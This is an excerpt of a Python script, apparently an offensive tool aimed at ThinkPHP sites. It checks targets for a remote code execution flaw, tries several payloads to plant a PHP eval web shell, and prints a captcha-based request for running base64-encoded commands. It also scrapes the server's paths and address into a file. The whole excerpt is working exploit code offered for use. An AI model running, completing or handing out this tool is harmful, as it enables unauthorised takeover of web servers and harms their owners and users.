...
def req_get(url, proxy):
    ...
    if proxy:
        try:
            ress = requests.get(url=url, headers=headers, verify=False, allow_redirects=False, proxies=proxy, timeout=5)
            ress.encoding = 'utf-8'
            # res_body = res.text
        except:
            print("网络出错！")
        ...
        try:
            ress = requests.get(url=url, headers=headers, verify=False, allow_redirects=False, timeout=5)
            ress.encoding = 'utf-8'
            # res_body = res.text
        except:
            print("网络出错！")
...
def think_rce_check(host, proxy):
    ...
    if success:
        print("存在thinkphp_RCE! 可用Payload:")
        for p in success:
            print("{}".format(p))
...
def getshell(host,proxy):
    ...
    headers["Host"] = parse.urlparse(host).hostname
    success = False
    shell = "<?php echo 1;@eval($_REQUEST[1]);?>"
    ...
    for k in payload:
        ...
        if getshell_res.status_code == 200:
            print("Getshell succeed，shell address： " + host + "/1ndex.php\n")
    ...
    if not success:
        ...
        if ('PHP Version' in getshell_res4.text) or ('PHP Extension Build' in getshell_res4.text):
            print(
                "Getshell success, You can use POST " + host + "/?s=captcha&r=cGhwaW5mbygpOw==\n" + "  _method=__construct&filter[]=base64_decode&filter[]=think\__include_file&method=get&server[]=1&get[]={}".format(
                    base64_))
            print("r 参数是命令的base64编码\n")
    ...
    if not success:
        ...
        try:
            ...
            if ("098f6bcd4621d373cade4e832627b4f6" in getshell_res5.text):
                print('[+] Getshell success: ' + shell_url_5 + "\n")
        ...
        if div_html_5:
            for j in div_html_5:
                if j.strong.text == 'THINK_VERSION':
                    ...
                    print("ThinkPHP Version: {}".format(j.small.text.strip()))
                if j.strong.text == 'DOCUMENT_ROOT':
                    fo.write('DOCUMENT ROOT: {}\n'.format(j.small.text.strip()))
                    print("DOCUMENT ROOT: {}".format(j.small.text.strip()))
                if j.strong.text == 'SERVER_ADDR':
                    fo.write('SERVER ADDR: {}\n'.format(j.small.text.strip()))
                    print("SERVER ADDR: {}".format(j.small.text.strip()))
                if j.strong.text == 'LOG_PATH':
                    fo.write('LOG PATH: {}\n'.format(j.small.text.strip()))
                    print("LOG PATH: {}".format(j.small.text.strip()))
        elif div_html_3 and div_html_3_path:
            fo.write('ThinkPHP Version: {}\n'.format(div_html_3.text))
            fo.write('ThinkPHP Path: {}\n'.format(div_html_3_path[0].p.text))
            print("ThinkPHP Version: {}".format(div_html_3.text))
            print("ThinkPHP Path: {}".format(div_html_3_path[0].p.text))
    fo.close()


def check_host(host):
    if not host.startswith("http"):
        print('ERROR: Host "{}" should start with http or https\n'.format(host))
        return False
    else:
        return True
